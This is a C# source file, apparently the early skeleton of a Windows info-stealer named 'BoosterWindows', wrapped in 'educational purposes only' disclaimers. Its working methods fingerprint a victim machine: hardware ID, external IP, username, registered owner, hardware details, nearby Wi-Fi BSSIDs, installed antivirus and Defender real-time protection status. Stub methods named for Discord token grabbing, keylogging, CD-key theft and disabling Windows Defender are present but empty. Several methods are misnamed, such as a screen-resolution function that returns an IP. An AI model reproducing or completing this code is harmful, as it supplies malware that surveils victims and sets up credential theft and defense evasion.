/*Disclaimer
 * All is for educational purposes only!!! 
 * don't use this software for attack someone and not even for test it on yourself i did this only for my 
 * personal study purposes  :)
*/

using Caliburn.Micro;
using DocumentFormat.OpenXml.Drawing;
using Microsoft.Win32;
using Microsoft.UI;
using Windows.Graphics;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection.Emit;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using Windows.Graphics;
using System.Diagnostics; 
using System.Windows.Input;//all the libraries

namespace BoosterWindows
{
    public class Class1
    {

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool GetPhysicallyInstalledSystemMemory(out long TotalMemoryInKilobytes);  //including a library :)


        //Getting the key values more faster :) kinda easy tbh idk why i am codingf that only now
        public string searchKeyValueLocalMachine(string path, string keyName)
        {
            string keyValueToReturn = null;

            using (RegistryKey key = Registry.LocalMachine.OpenSubKey($@"{path}"))
            {
                if (key != null)
                {
                    Object o = key.GetValue($"{keyName}");
                    if (o != null)
                    {
                        keyValueToReturn = o.ToString();
                        return keyValueToReturn;
                    }
                }
            }
            return null;
        }

        //Getting the key values more faster :) kinda easy tbh idk why i am codingf that only now
        public string searchKeyValueCurrentUser(string path, string keyName)
        {
            string keyValueToReturn = null;

            using (RegistryKey key = Registry.CurrentUser.OpenSubKey($@"{path}"))
            {
                if (key != null)
                {
                    Object o = key.GetValue($"{keyName}");
                    if (o != null)
                    {
                        keyValueToReturn = o.ToString();
                        return keyValueToReturn;
                    }
                }
            }
            return null;
        }


        //HWID
        public string getHWID()
        {
            string hwidAddr;

            using (RegistryKey key = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0001"))
            {
                if (key != null)
                {
                    Object o = key.GetValue("HwProfileGuid");
                    if (o != null)
                    {
                        hwidAddr = o.ToString();
                        return hwidAddr;
                    }
                }
            }
            return null;
        }

        //IP
        public string getIP()
        {
            string externalIpString = new WebClient().DownloadString("http://icanhazip.com").Replace("\\r\\n", "").Replace("\\n", "").Trim();
            var externalIp = IPAddress.Parse(externalIpString);
            string ipGeneral = externalIp.ToString();
            return ipGeneral;
        }


        //Discord Token
        public string discordTokenGrabber()
        {
            return null;
        }


        //Current user name
        public string getLocalUserName()
        {
            string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            return userName.ToString();
        }


        //CurrentVersionRegEditInfo
        public string getRegisteredOwner()
        {

            string registeredOwner = null;

            using(RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"))
            {
                if (key != null)
                {
                    Object o = key.GetValue("RegisteredOwner");
                    if (o != null)
                    {
                        registeredOwner = o.ToString();
                        return registeredOwner;
                    }
                }
            }
            return null;
        }


        //Product Name (windows product name)
        public string getProductName()
        {

            string productName = null;

            using (RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"))
            {
                if (key != null)
                {
                    Object o = key.GetValue("ProductName");
                    if (o != null)
                    {
                        productName = o.ToString();
                        return productName;
                    }
                }
            }
            return null;
        }


        //Get Keyboard Layout
        public string getkeyboardLayout()
        {
            string keyboardLayout = null;
            
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey("SYSTEM\\Software\\Microsoft\\CTF\\Assemblies\\0x00000410\\{ 34745C63 - B2F0 - 4784 - 8B67 - 5E12C8701A31}"))
            {
                if (key != null)
                {
                    Object o = key.GetValue("KeyboardLayout");
                    if (o != null)
                    {
                        keyboardLayout = o.ToString();
                        return keyboardLayout;
                    }
                }
            }
            return null;
        }


        //Get current system date
        public string getDate()
        {
            DateTime localDate = DateTime.Now;
            return localDate.ToString();
        }

        //Detect Antivirus
        public bool AntivirusInstalled()
        {

            string wmipathstr = @"\\" + Environment.MachineName + @"\root\SecurityCenter";
            try
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(wmipathstr, "SELECT * FROM AntivirusProduct");
                ManagementObjectCollection instances = searcher.Get();
                return instances.Count > 0;
            }

            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

            return false;
        }


        //Get current language 
        public string getLanguage()
        {
            CultureInfo ci = CultureInfo.InstalledUICulture;
            return ci.Name;
        }


        //Get currrent installed processor info
        public string getCurrentProcessor()
        {
            return System.Environment.GetEnvironmentVariable("PROCESSOR_IDENTIFIER").ToString();
        }


        //Get CPU
        public string CPU()
        {
            ManagementObjectSearcher mos =
            new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
            foreach (ManagementObject mo in mos.Get())
            {
                return (mo["Name"]).ToString();
            }
            return null;
        }


        //Get current GPU name 
        public string getGPUname()
        {
            using (var searcher = new ManagementObjectSearcher("select * from Win32_VideoController"))
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    return obj["Name"].ToString();
                }
            }

            return null;
        }


        //Get the ramAmount
        public string ramAmount()
        {
            long memKb;
            GetPhysicallyInstalledSystemMemory(out memKb);
            return (memKb / 1024 / 1024).ToString();
        }

        
        public string getScreenResolution()
        {
            string hostName = Dns.GetHostName();
            string myIP = Dns.GetHostByName(hostName).AddressList[0].ToString();
            return myIP;
        }

        public string getMacAddress()
        {
            Process proc = new Process();
            proc.StartInfo.CreateNoWindow = true;
            proc.StartInfo.FileName = "cmd";

            proc.StartInfo.Arguments = @"/C ""netsh wlan show networks mode=bssid | findstr BSSID """;

            proc.StartInfo.RedirectStandardOutput = true;
            proc.StartInfo.UseShellExecute = false;
            proc.Start();
            string output = proc.StandardOutput.ReadToEnd();
            proc.WaitForExit();

            return output.ToString();
        }


        //Get cd key (Not working)
        public string getCdKey()
        {
            return null;
        }



        //diasble windows defender (Not working)
        public string disableWindowsDefender()
        {

            // this will be long :(

            return null;
        }


        //Gettign bios version (work sometimes)
        public string getBIOSversion()
        {
            string keyboardLayout = null;

            using (RegistryKey key = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System"))
            {
                if (key != null)
                {
                    Object o = key.GetValue("SystemBiosVersion");
                    if (o != null)
                    {
                        keyboardLayout = o.ToString();
                        return keyboardLayout;
                    }
                }
            }
            return null;
        }


        //get bios vendor (working!)
        public string getBiosVendor()
        {
            string keyboardLayout = null;

            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\BIOS"))
            {
                if (key != null)
                {
                    Object o = key.GetValue("BIOSVendor");
                    if (o != null)
                    {
                        keyboardLayout = o.ToString();
                        return keyboardLayout;
                    }
                }
            }
            return null;
        }


        //get mothergboard name  (working!)
        public string getMotherboard()
        {
            string keyboardLayout = null;

            using (RegistryKey key = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\BIOS"))
            {
                if (key != null)
                {
                    Object o = key.GetValue("BaseBoardProduct");
                    if (o != null)
                    {
                        keyboardLayout = o.ToString();
                        return keyboardLayout;
                    }
                }
            }
            return null;
        }



        //this commadn make you know if the real time protection is active!
        public string realTimeProtectionBoolCheck()
        {
            string keyboardLayout = null;

            using (RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection"))
            {
                if (key != null)
                {
                    Object o = key.GetValue("EnableRealTimeMonitoring");
                    if (o != null)
                    {
                        keyboardLayout = o.ToString();
                        int a = Int32.Parse(keyboardLayout);

                        if (a == 0)
                        {
                            keyboardLayout = "True";
                            return keyboardLayout;
                        }else if (a == 1)
                        {
                            keyboardLayout = "False";
                            return keyboardLayout;
                        }
                        else
                        {
                            keyboardLayout = "Can't fetch the RegKey!";
                            return keyboardLayout;
                        }

                    }
                }
            }
            return null;
        }


        //Getting the appdata path
        public string getAppDataPath()
        {
            string path = "Volatile Environment";
            string keyName = "APPDATA";
            string result = searchKeyValueCurrentUser(path, keyName);
            return result;
        }


        public string keylogger()
        {
            return null;
        }
    }
} // all the text is outlined and commented enjoy my work ;)


/*Disclaimer
 * All is for educational purposes only!!! 
 * don't use this software for attack someone and now even for test it on yourself i did this only for my 
 * personal study purposes  :)
*/ // <-- read me!
